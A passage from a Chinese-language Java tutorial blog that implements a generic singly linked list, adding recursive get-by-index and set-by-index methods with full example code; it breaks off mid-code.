class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073702.jpg"                      alt="image-20220802012458341"                ></p><p>​    集合的数据一般如果要返回肯定要以对象数组的形式返回。</p><h5 id="根据索引取得数据"><a href="#根据索引取得数据" class="headerlink" title="根据索引取得数据"></a>根据索引取得数据</h5><p>​    根据索引取得数据：public E get(int index)</p><p>​    链表的可以像数组一样进行处理，所以也应该可以像数组一样进行索引数据的获取，在这样的情况下就可以继续利用递归的形式完成。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073703.jpg"                      alt="image-20220802013632774"                ></p><p>​    1、在ILink的接口里追加新的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br></pre></td></tr></table></figure><p>​    2、在Node类里面追加有根据索引获取数据的处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">        <span class="comment">//索引相同</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、在LinkImpl子类里面定义数据获取的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">    <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ILink&lt;String&gt; all = <span class="keyword">new</span> <span class="title class_">LinkImpl</span>&lt;&gt;();</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之前数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        all.add1(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">        all.add1(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;增加之后数据个数：&quot;</span> + all.size1() + <span class="string">&quot;、是否为空集合：&quot;</span> + all.isEmpty());</span><br><span class="line">        Object[] result = all.toArray();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------数据获取的分割线----------------&quot;</span>);</span><br><span class="line">        System.out.println(all.get(<span class="number">0</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">1</span>));</span><br><span class="line">        System.out.println(all.get(<span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073707.jpg"                      alt="image-20220802014720185"                ></p><p>​    这一特点和数组是很相似的，但是需要注意的是，数组获取一个数据的时间复杂度为1，而链表获取数据的时间复杂度为n。</p><h5 id="链表（修改指定索引数据）"><a href="#链表（修改指定索引数据）" class="headerlink" title="链表（修改指定索引数据）"></a>链表（修改指定索引数据）</h5><p>​    修改指定索引数据：public void set(int index,E data)</p><p>​    现在已经可以根据索引来获取指定的数据了，但是既然可以获取数据，那么也可以进行数据的修改。</p><p>​    1、在ILink的接口中追加新的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index,E data)</span>;<span class="comment">//修改索引数据</span></span><br></pre></td></tr></table></figure><p>​    2、在Node类中应该提供有数据修改的处理支持</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index,E data)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">        <span class="comment">//索引相同</span></span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    3、在LinkImpl的子类里面进行方法的覆写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">    <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">    <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表数据增加</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span>;<span class="comment">//修改索引数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl.<span class="built_in">this</span>.returnData[LinkImpl.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="built_in">this</span>.data = data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span 